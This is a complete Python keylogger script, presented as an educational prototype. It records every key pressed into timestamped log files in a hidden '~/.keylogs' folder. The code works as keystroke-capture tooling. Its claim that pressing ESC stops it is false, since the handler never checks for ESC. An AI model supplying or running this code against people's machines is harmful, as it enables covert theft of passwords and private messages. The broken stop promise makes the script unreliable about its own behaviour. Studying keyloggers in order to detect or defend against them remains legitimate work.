"""Advanced Keylogger Prototype — For Authorized and Educational Use Only."""

from pynput import keyboard
import logging
import os
from datetime import datetime

# 📁 Step 1: Define log file path in user's home directory
log_dir = os.path.expanduser("~/.keylogs")
os.makedirs(log_dir, exist_ok=True)
log_file_path = os.path.join(log_dir, f"keylog_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log")

# 🧾 Step 2: Configure logging format with timestamp
logging.basicConfig(
    filename=log_file_path,
    level=logging.INFO,
    format='%(asctime)s - %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S'
)

# ⌨️ Step 3: Define key press handler
def on_press(key):
    try:
        logging.info(f"Key pressed: {key.char}")
    except AttributeError:
        # Handles special keys like shift, ctrl, etc.
        logging.info(f"Special key pressed: {key}")

# 🛡️ Step 4: Use listener with proper error handling
try:
    with keyboard.Listener(on_press=on_press) as listener:
        print("🔐 Keylogger is active. Press ESC to stop.")
        listener.join()
except Exception as e:
    logging.error(f"An error occurred: {e}")
    print(f"❌ Error: {e}")
# 🛑 Step 5: Graceful exit on ESC key